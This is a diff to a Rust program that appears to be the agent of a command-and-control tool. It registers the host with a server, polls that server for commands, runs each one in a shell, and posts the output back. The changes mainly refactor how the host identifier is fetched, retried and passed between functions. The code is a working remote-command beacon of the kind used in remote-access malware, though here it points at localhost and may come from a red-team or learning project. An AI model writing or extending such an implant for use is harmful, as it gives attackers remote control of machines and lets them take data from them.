@@ -12,9 +12,8 @@ use std::io::Read;
 
 const sleep_time: Duration = time::Duration::from_millis(5000);
 const server_ip: &str = "http://127.0.0.1:8080";
-const identifier: &str = initHost();
 
-fn initHost() -> &str{
+fn initHost() -> Option<String>{
     let mut ip = "";
     let mut os = "";
     if cfg!(windows) {
@@ -29,30 +28,27 @@ fn initHost() -> &str{
     let url = format!("{}/hosts/newHost",server_ip);
     let hostname = match client.post(url).json(&text).send(){
         Ok(ok)=>{
-            ok.text().unwrap()
+            let id = ok.text().unwrap().to_string(); 
+            print(&id);
+            Some(id)
         }, Err(_)=>{
-            print(&"Can't connect to server");
-            let sleep_time = time::Duration::from_millis(5000);
-            thread::sleep(sleep_time);
-            initHost()
+            print(&"InitHost - Can't connect to server");
+            None
         }
-    }.to_string();
-    print(&hostname);
-    return &hostname;
+    };
+    return hostname;
 }
 
 fn getCommands(identifier:&str){
     let commands_url = format!("{}/hosts/{}/commands",server_ip,identifier);
-    let checkin_url = format!("{}/hosts/{}/checkIn",server_ip,identifier);
 	let client = Client::new();
 	let res = match client.get(commands_url).send(){
         Ok(ok)=>{
             ok.text().unwrap()
         }, Err(_)=>{
-            print(&"Can't connect to server");
-            let sleep_time = time::Duration::from_millis(5000);
+            print(&"Get_Commands - Can't connect to server");
             thread::sleep(sleep_time);
-            initHost()
+            return
         }
     };
     let res = format!(r#"{}"#,res);
@@ -70,15 +66,15 @@ fn getCommands(identifier:&str){
         print("Command Received:");
         print(&format!("\tCommand ID: {}\n\tCommand: {}",&cmd_id, &command));
         count+=1;
-        handle_command(&cmd_id, &command);
+        handle_command(&cmd_id, &command, &identifier);
     }
 }
 
-fn handle_command(cmd_id:&str, command:&str){
+fn handle_command(cmd_id:&str, command:&str, identifier: &str){
     //run command
     if command.len() > 2{
         if command.eq("checkIn"){
-            post_response(&cmd_id,&"checkIn-pong");
+            post_response(&cmd_id,&"checkIn-pong", &identifier);
             print("checked in TODO");
             return;
         }
@@ -86,14 +82,14 @@ fn handle_command(cmd_id:&str, command:&str){
             let path = Path::new(&command[3..]); //the path is the remaining
             set_current_dir(path);
             let cmd_out = &run_command(&"pwd");
-            post_response(&cmd_id, &cmd_out);
+            post_response(&cmd_id, &cmd_out, &identifier);
         } else{
             let cmd_out = &run_command(&command);
-            post_response(&cmd_id, &cmd_out);
+            post_response(&cmd_id, &cmd_out, &identifier);
         }
     }else{
         let cmd_out = &run_command(&command);
-        post_response(&cmd_id, &cmd_out);
+        post_response(&cmd_id, &cmd_out, &identifier);
     }
 }
 
@@ -137,19 +133,17 @@ fn run_command(cmd: &str) -> String {
     return cmd_out;
 }
 
-fn post_response(cmd_id: &str, response: &str){
+fn post_response(cmd_id: &str, response: &str, identifier: &str){
     let responses_url = format!("{}/hosts/{}/responses",server_ip, identifier);
     print(&format!("\tcmd_id: {}\n\tResponse: {}",cmd_id,response));
     let text = format!("{{\"cmd_id\": \"{}\",\"response\": \"{}\"}}",cmd_id,response);
     let client = reqwest::blocking::Client::new();
     let res = match client.post(&responses_url).json(&text).send(){
         Ok(ok)=>{
-            ok
+            ok.text().unwrap()
         }, Err(_)=>{
-            print(&"Can't connect to server");
-            let sleep_time = time::Duration::from_millis(5000);
-            thread::sleep(sleep_time);
-            initHost()
+            print(&"Post_Response - Can't connect to server");
+            return
         }
     };
     print("Successfully posted response to server.")
@@ -162,7 +156,23 @@ fn print(txt:&str){
     }
 }
 
+fn get_id() -> String {
+    loop{
+        let identifier = match initHost(){
+            Some(id)=>{
+                id
+            }, None=>{
+                print(&"Get_id - Can't connect to server");
+                thread::sleep(sleep_time);
+                continue;
+            }
+        };
+        return identifier;
+    }
+}
+
 fn main(){
+    let identifier = get_id();
     loop{
         getCommands(&identifier);
         thread::sleep(sleep_time);
